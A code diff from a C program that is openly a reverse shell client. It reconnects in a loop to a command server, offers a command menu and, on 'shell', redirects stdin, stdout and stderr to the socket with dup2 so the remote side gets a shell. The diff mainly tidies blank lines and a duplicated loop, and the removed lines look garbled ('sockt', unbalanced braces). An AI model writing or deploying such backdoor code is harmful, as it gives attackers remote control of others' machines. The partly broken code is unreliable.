@@ -27,13 +27,7 @@ int main(void)
 		connection_established = connect(sock, (struct sockaddr *) &sa, sizeof(sa)); 
 	} while(connection_established != 0);
 
-
 	write(sock, MSG_HELLO, strlen(MSG_HELLO));
-	while (connection_established == 0){
-		while((n = read(sockt, buffer, MAXBUF)) > 0){
-			if(strncmp(buffer, "help\n", 5) == 0){
-				char* help = "\n\t  Command Session Menu\n-------------------------------------------\nshell - initiates a shell session\nhelp - displays this menu\n!exit - exits back to command server\n\n";
-
 
 	while (connection_established == 0)
 	{
@@ -56,10 +50,8 @@ int main(void)
 				{
 					char shell_msg[50];
 					snprintf(shell_msg, 50, "\nReverse shell session started on PID %i\n", getpid());
-
 					write(sock, shell_msg, strlen(shell_msg));
 
-					
 					dup2(sock, 0);
 					dup2(sock, 1);
 					dup2(sock, 2);
